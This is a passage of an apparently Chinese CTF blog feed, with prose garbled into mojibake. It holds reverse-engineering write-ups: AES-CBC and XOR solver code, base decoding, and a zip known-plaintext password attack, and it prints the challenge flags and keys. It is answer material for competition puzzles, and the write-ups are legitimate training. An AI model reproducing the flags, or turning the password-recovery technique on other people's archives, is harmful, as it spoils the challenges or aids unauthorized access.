i++)</span><br><span class="line">p[i] = rsbox[p[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">0x91</span>, <span class="number">0xb3</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x5d</span>, <span class="number">0xd5</span>, <span class="number">0xce</span>, <span class="number">0x3a</span>, <span class="number">0x1d</span>, <span class="number">0x30</span>, <span class="number">0xe4</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x6b</span>, <span class="number">0xd7</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0xa3</span>, <span class="number">0xa5</span>, <span class="number">0xdf</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x1c</span>, <span class="number">0x02</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x20</span>, <span class="number">0x7a</span>, <span class="number">0xfd</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0xf8</span>, <span class="number">0xa9</span>, <span class="number">0xf9</span>, <span class="number">0xf1</span>, <span class="number">0x6b</span>, <span class="number">0x1c</span>, <span class="number">0x0f</span>, <span class="number">0x5d</span>, <span class="number">0x50</span>, <span class="number">0x5b</span>, <span class="number">0xec</span>, <span class="number">0x42</span>, <span class="number">0xd1</span>, <span class="number">0x8c</span>, <span class="number">0xb8</span>, <span class="number">0x12</span>, <span class="number">0xcf</span>, <span class="number">0x2c</span>, <span class="number">0xa9</span>, <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x46</span>, <span class="number">0xfd</span>, <span class="number">0x9b</span>, <span class="number">0xea</span>, <span class="number">0xde</span>, <span class="number">0xc8</span>, <span class="number">0xbf</span>, <span class="number">0x94</span>, <span class="number">0x69</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = a+<span class="number">48</span>, *p1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fun_xor(<span class="number">0xe</span>, p);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">13</span>; ; j--)</span><br><span class="line">&#123;</span><br><span class="line">InvShift(p);</span><br><span class="line">InvSub(p);</span><br><span class="line">fun_xor(j, p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">InvMixColumns(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">3</span>)</span><br><span class="line">p1 = p<span class="number">-16</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p1 = iv;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">p[k] ^= p1[k];</span><br><span class="line">&#125;</span><br><span class="line">p = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶å®å†™å¥½é€†è¿‡ç¨‹åï¼Œå¼€å§‹ä¸€ç›´è§£ä¸æ¥ï¼Œåé¢ä¸€ä¸ªä¸€ä¸ªæ’æŸ¥å†å‘ç°æ˜¯å¯†æ–‡æ‰¾é”™äº†ï¼Œ<strong>å†æ¬¡è¢«ä»idaçš„ä¼ªä»£ç æ¥çœ‹å˜é‡çš„å€¼å‘åˆ°</strong>ã€‚ã€‚ã€‚</p><p><strong>å¦å¤–è¿™ä¸ªaesåŠ å¯†å¹¶æ²¡æœ‰é­”æ”¹çš„ï¼Œåé¢æˆ‘åˆç”¨pythonçš„aesæ¨¡å—è§£äº†ä¸€ä¸‹ï¼ŒåŒæ ·è§£å‡ºã€‚ã€‚é‚£ç°åœ¨é—®é¢˜å°±æ˜¯ç§»ä½å’Œæ··åˆçš„æ–¹å‘çš„é—®é¢˜ï¼ˆè¿™é‡Œå…ˆç•™ä¸€ä¸‹ï¼‰ï¼Œåé¢å†å¥½å¥½å­¦ä¹ ä¸€ä¸‹ã€‚è‡³äºå—é•¿åº¦å’Œå¯†é’¥é•¿åº¦æ˜¯æ²¡å…³ç³»çš„ã€‚</strong></p><p>æœ€åå°±æ€»ç»“ä¸€ä¸‹aesåŠ å¯†çš„å¤§æ¦‚ï¼š</p><blockquote><ol><li><strong>é‡å¤è½®ï¼š128ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ9æ¬¡ï¼Œ192ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ11æ¬¡ï¼Œ256ä½å¯†é’¥ä¸€èˆ¬é‡å¤æ‰§è¡Œ13æ¬¡ã€‚</strong></li><li><strong>é‡å¤è½®æ¯è½®é‡å¤çš„æ“ä½œåŒ…æ‹¬ï¼šå­—èŠ‚æ›¿æ¢ã€è¡Œç§»ä½ã€åˆ—æ··ä¹±ã€è½®å¯†é’¥åŠ ã€‚</strong></li><li><strong>åœ¨aesä¸­å—é•¿åº¦ä¸éƒ½æ˜¯128ä½ï¼Œä¸å¯†é’¥é•¿åº¦æ— å…³ã€‚</strong></li><li><strong>æ¯æ‰§è¡Œä¸€å—çš„åŠ å¯†æ“ä½œï¼Œå¼€å§‹æ˜¯ä¸€ä¸ªåˆå§‹è½®ï¼ˆä¸åˆå§‹å¯†é’¥å¼‚æˆ–ï¼‰ï¼Œç„¶åé‡å¤è½®ï¼Œæœ€åä¸€ä¸ªæœ€ç»ˆè½®ï¼ˆé™¤å¼€åˆ—æ··æ··åˆæ“ä½œï¼‰ã€‚</strong></li></ol></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><p>ä»æ¯ä¸€æ­¥éª¤åçš„å­—ç¬¦ç»„æˆå¯ä»¥å®¹æ˜“è¾¨è®¤å‡ºæ¥ã€‚</p><p>base64ï¼Œbase32ï¼Œbase16</p><h3 id="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"><a href="#ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•" class="headerlink" title="ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•"></a>ä¸èµ·çœ¼å‹ç¼©åŒ…çš„å…»æˆçš„æ–¹æ³•</h3><p>ä»å›¾ç‰‡æœ€åçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…å’Œæç¤ºå¯†ç æ˜¯å›¾ç‰‡idã€‚</p><p><a href="https://saucenao.com/" target="_blank" rel="noopener">https://saucenao.com/</a> ä¸Šè¿™ä¸ªç½‘ç«™æŸ¥è¯¥å›¾ç‰‡çš„idã€‚</p><p>è§£å‹åå¾—åˆ°plain.zipå’ŒNO PASSWORD.txtï¼Œè€Œplain.zipåˆè¦å¯†ç ï¼Œçœ‹äº†ä¸€ä¸‹é‡Œé¢çš„æ–‡ä»¶ï¼Œå‘ç°ä¹Ÿæœ‰ä¸€ä¸ªNO PASSWORD.txtæ–‡ä»¶ï¼Œå®ƒä»¬crc32å€¼ã€‚</p><p>è¿™ç”±æ­¤æƒ³åˆ°åº”è¯¥æ˜¯æ˜æ–‡æ”»å‡»äº†ï¼Œè€Œæ˜æ–‡æ”»å‡»æœ‰ä¸€ä¸ªæ¡ä»¶ï¼Œ2ä¸ªæ–‡ä»¶çš„å‹ç¼©æ–¹å¼è¦ç›¸åŒï¼Œè¿™åœ¨NO PASSWORD.txtä¸­æœ‰æç¤ºã€‚</p><p><img src="https://i.loli.net/2021/02/27/GRqjEDtQSy2rYsb.png" alt="image-20210204222714426"></p><p>æ˜æ–‡æ”»å‡»å¾—åˆ°å¯†ç ï¼š</p><p><img src="https://i.loli.net/2021/02/27/oYBRAm6M51IbNpl.png" alt="image-20210204222741818"></p><p>æœ€åæ‰“å¼€flagæ–‡ä»¶ï¼Œæ˜¯å®ä½“ç¼–ç  entity codeï¼Œç”¨htmlå†™å¤„ä¸€ä¸ªæ ‡é¢˜è®©æµè§ˆå™¨è§£æå®ƒã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/27/PXbVClN4UeKqJwj.png" alt="image-20210204223003807"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021ä¸€æœˆDASCTFæš¨HWSç¡¬ä»¶å†¬ä»¤è¥é€‰æ‹”èµ›</title>
      <link href="/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>äºŒè¿›åˆ¶ä¸“åœºï¼ŒReverseåšå®Œäº†ï¼Œå†…æ ¸å®‰å…¨åšäº†1ä¸ªï¼Œå›ºä»¶å®‰å…¨åšäº†3ä¸ªã€‚æ€»çš„æ¥è¯´é¢˜ç›®éš¾åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œä½†è€ƒç‚¹è¿˜è¡Œã€‚æ’åç¬¬ä¸€ï¼Œä¸ªäººåšäº†1820åˆ†ï¼Œå…¶ä¸­pwnæ˜¯i0ganåšçš„ã€‚<a id="more"></a></p><p><img src="https://i.loli.net/2021/02/03/QS2rJ9EkmviR5Xy.png" alt="image-20210201212702456"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>æ‹¿äº†äºŒè¡€ã€‚é€†å‘æ–¹å‘çš„ç­¾åˆ°é¢˜ï¼Œç›´æ¥ç©·ä¸¾ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">18</span>,  <span class="number">69</span>,  <span class="number">16</span>,  <span class="number">71</span>,  <span class="number">25</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">26</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">28</span>,  <span class="number">30</span>,  <span class="number">82</span>, <span class="number">102</span>,  <span class="number">29</span>,  <span class="number">82</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">101</span>, <span class="number">111</span>,  <span class="number">95</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">94</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">163</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">int</span> v5 = j;</span><br><span class="line"><span class="keyword">int</span> v4 = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5);</span><br><span class="line">v5 ^= v4;</span><br><span class="line">v4 = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 );</span><br><span class="line"><span class="keyword">if</span>((v5 ^ <span class="number">0x23</span>) == enc[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>è¿™ä¸ªé¢˜ï¼Œè¢«ä»ä¼ªä»£ç æ¥è¾¨è¯†å˜é‡çš„å€¼å‘åˆ°äº†ï¼Œè¿˜æ˜¯è¦ä»æ±‡ç¼–ä»£ç æ¥çœ‹é è°±ã€‚</p><p>é¦–å…ˆé¢˜ç›®æœ‰ä¸€ä¸ªæ··æ·†ï¼Œä½†å¾ˆç®€å•ï¼Œpatchæ‰æ–¹ä¾¿ç‚¹ï¼Œä½†ä¸patchä¹Ÿä¸å½±å“ã€‚</p><p><img src="https://i.loli.net/2021/02/03/WlwNj2E3zCGAt6u.png" alt="image-20210201220900210"></p><p>è·Ÿäº†æŒºä¹…çš„åŠ å¯†è¿‡ç¨‹ï¼Œå¼‚æˆ–æ¯”è¾ƒå¤šï¼Œç„¶åå‡†å¤‡é€†å‘çš„æ—¶å€™å‘ç°ï¼ŒAESçš„ç‰¹å¾å•Šã€‚å¼€å§‹ä»¥ä¸ºæ˜¯å¸¸è§„çš„aesçš„è§£å¯†ï¼Œä½†å…¶å®ä¸ç„¶ï¼ŒåŠ ä¸Šé¢˜ç›®å‡ æ¬¡å¼‚æˆ–å¯¹ä¸ç†Ÿæ‚‰aesåŠ å¯†æ¥è¯´è¿·æƒ‘æ€§æŒºå¤§çš„ã€‚</p><p>è¿™æ ·åœ¨è¿™äº›åŠ å¯†å‡½æ•°å¾˜å¾Šäº†å¾ˆä¹…ï¼Œä¸æ¸…æ¥šè¿™ä¸ªaesåˆ°åº•è¦åšä»€ä¹ˆã€‚</p><p>æœ€åçœ‹äº†çœ‹å¦‚æœæˆ‘ä»¬è¾“å…¥æ­£ç¡®åè¦æ‰§è¡Œçš„å‡½æ•°ï¼Œè”æƒ³è¾“å…¥ï¼ŒåŠ ä¸Šè¿™é‡Œå‡½æ•°å°‘ï¼Œè¯†åˆ«èµ·æ¥ç›¸å¯¹å®¹æ˜“äº›ï¼Œå‘ç°å°±æ˜¯ä½¿ç”¨æˆ‘ä»¬è¾“å…¥å½“ä½œkeyæŠŠå¯†æ–‡è¿›è¡ŒAESè§£å¯†ã€‚ä¸ç¡®å®šçš„è¯è¿˜å¯ä»¥è‡ªå·±ç”¨æ•°æ®æ‰§è¡Œè¿™é‡Œçš„å‡½æ•°æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><p>ç”±äºè¿™é‡Œçš„å‡½æ•°å·²ç»ç¡®å®šåŠŸèƒ½äº†ï¼Œçœ‹çœ‹å®ƒä»¬æœ‰æ²¡æœ‰åœ¨å‰é¢å¼•ç”¨è¿‡ï¼Œæœç„¶æœ‰çš„ã€‚è¿™æ ·å°±å¯¹æˆ‘ä»¬åˆ†æå‰é¢èµ·åˆ°äº†å¾ˆå¤§çš„å¸®åŠ©äº†ã€‚</p><p><img src="https://i.loli.net/2021/02/03/za8Ascqm9CWSEow.png" alt="image-20210201223206546"></p><p>è¿™æ ·åï¼Œå†ç»§ç»­å›åˆ°å‰é¢åˆ†æï¼Œæ€»ç»“ä¸€ä¸‹æµç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/02/03/E1IKJlr5nMNxhU6.png" alt="image-20210201222517573"></p><p>è§£å¯†è¿‡ç¨‹ï¼š</p><p>æŠŠå¯†æ–‡å…ˆå¼‚æˆ–ä¸€ä¸‹ï¼Œç„¶åè¿›è¡ŒaesåŠ å¯†ï¼Œå…¶å®æ˜¯æ˜¯å¤šäº†ä¸ªivçš„CBCæ¨¡å¼çš„AESåŠ å¯†ï¼Œä½†è¿™é‡Œåªæœ‰ä¸€ç»„ã€‚æ‰€ä»¥æˆ‘ç›´æ¥ECBæ¨¡å¼åŠ å¯†è‡ªå·±å†å¼‚æˆ–ä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'8ce51f9350f44511a854e1b5f0a3fbca'</span></span><br><span class="line">    key = bytes.fromhex(key)                     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        meg = cryptos.decrypt(decrpytBytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> meg.encode()</span><br><span class="line"></span><br><span class="line">plaint = <span class="string">'4ff5e148c1d81254533e3a4bd47cfe72'</span></span><br><span class="line">plaint = bytes.fromhex(plaint)</span><br><span class="line">a = AesEncry().encrypt(plaint)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>å„ç§å¼‚æˆ–æ“ä½œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">198</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">231</span>, <span class="number">7</span>, </span><br><span class="line">  <span class="number">38</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op2[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">42</span>, <span class="number">253</span>, <span class="number">103</span>, <span class="number">31</span>, <span class="number">159</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">56</span>, </span><br><span class="line">  <span class="number">118</span>, <span class="number">164</span>, <span class="number">182</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">141</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mem[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">33</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">87</span>, <span class="number">165</span>, <span class="number">167</span>, <span class="number">67</span>, <span class="number">137</span>, </span><br><span class="line">  <span class="number">74</span>, <span class="number">14</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">31</span>, <span class="number">195</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">110</span>, <span class="number">214</span>, <span class="number">206</span>, <span class="number">97</span>, <span class="number">187</span>, <span class="number">143</span>, <span class="number">183</span>, <span class="number">243</span>, <span class="number">16</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">69</span>, <span class="number">158</span>, <span class="number">252</span>, <span class="number">225</span>, <span class="number">177</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">140</span>, <span class="number">229</span>, <span class="number">31</span>, <span class="number">147</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">168</span>, <span class="number">84</span>, </span><br><span class="line">  <span class="number">225</span>, <span class="number">181</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">251</span>, <span class="number">202</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor2[] = &#123;<span class="number">236</span>, <span class="number">251</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">249</span>, <span class="number">231</span>,</span><br><span class="line"> <span class="number">139</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">63</span>, <span class="number">80</span>, <span class="number">130</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">68</span>, <span class="number">43</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ans[] = &#123;<span class="number">192</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">127</span>, <span class="number">219</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">77</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">254</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">227</span>, <span class="number">85</span>, <span class="number">38</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mem[i] ^= xor1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">op1[i] ^= op2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] ^= xor2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#02x"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç§»ä½è¿˜åŸï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">16</span>] = &#123;<span class="number">0x2c</span>, <span class="number">0xa7</span>, <span class="number">0x73</span>, <span class="number">0xe</span>, <span class="number">0x86</span>, <span 